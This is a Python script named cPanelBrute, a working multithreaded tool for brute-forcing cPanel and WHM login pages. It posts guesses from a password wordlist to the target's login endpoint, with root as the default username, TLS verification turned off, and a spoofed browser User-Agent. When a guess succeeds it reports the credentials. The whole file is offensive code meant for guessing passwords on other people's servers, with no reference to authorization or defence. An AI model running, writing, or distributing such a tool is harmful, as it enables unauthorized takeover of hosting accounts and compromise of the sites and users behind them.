#!/usr/bin/env python3
"""
cPanelBrute - Simple cPanel Brute Force Tool
=============================================

A lightweight brute force tool for cPanel/WHM login pages.
Integrated with SNODE for easy targeting.

Usage:
    cpanelbrute -t <target> -u <username> -w <wordlist>
    cpanelbrute -t cpanel.example.com -u admin -w /usr/share/wordlists/rockyou.txt
"""

import argparse
import sys
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def try_login(target: str, username: str, password: str, port: int = 2083) -> tuple:
    """Attempt a single login."""
    url = f"https://{target}:{port}/login/?login_only=1"
    
    data = {
        "user": username,
        "pass": password,
        "goto_uri": "/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(
            url, 
            data=data, 
            headers=headers, 
            verify=False, 
            timeout=10,
            allow_redirects=False
        )
        
        # Check for success indicators
        if response.status_code == 200:
            if '"status":1' in response.text or "redirect" in response.text.lower():
                return (True, password)
        elif response.status_code == 301 or response.status_code == 302:
            # Redirect often means success
            location = response.headers.get("Location", "")
            if "/cpsess" in location or "frontend" in location:
                return (True, password)
                
    except requests.exceptions.RequestException:
        pass
    
    return (False, password)


def brute_force(target: str, username: str, wordlist: str, port: int = 2083, threads: int = 10):
    """Run brute force attack."""
    print(f"\n[*] cPanelBrute v1.0")
    print(f"[*] Target: {target}:{port}")
    print(f"[*] Username: {username}")
    print(f"[*] Wordlist: {wordlist}")
    print(f"[*] Threads: {threads}\n")
    
    # Load wordlist
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist}")
        sys.exit(1)
    
    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Starting brute force...\n")
    
    found = False
    tried = 0
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(try_login, target, username, pw, port): pw 
            for pw in passwords
        }
        
        for future in as_completed(futures):
            tried += 1
            success, password = future.result()
            
            if success:
                print(f"\n[+] SUCCESS! Password found: {password}")
                print(f"[+] Credentials: {username}:{password}")
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            else:
                if tried % 100 == 0:
                    print(f"[*] Tried {tried}/{len(passwords)} passwords...")
    
    if not found:
        print(f"\n[-] No valid password found after {tried} attempts")
    
    return found


def main():
    parser = argparse.ArgumentParser(
        description="cPanelBrute - cPanel/WHM Brute Force Tool"
    )
    parser.add_argument("-t", "--target", required=True, help="Target hostname (e.g., cpanel.example.com)")
    parser.add_argument("-u", "--username", default="root", help="Username (default: root)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("-p", "--port", type=int, default=2083, help="Port (default: 2083 for cPanel, 2087 for WHM)")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    
    args = parser.parse_args()
    
    brute_force(
        target=args.target,
        username=args.username,
        wordlist=args.wordlist,
        port=args.port,
        threads=args.threads
    )


if __name__ == "__main__":
    main()
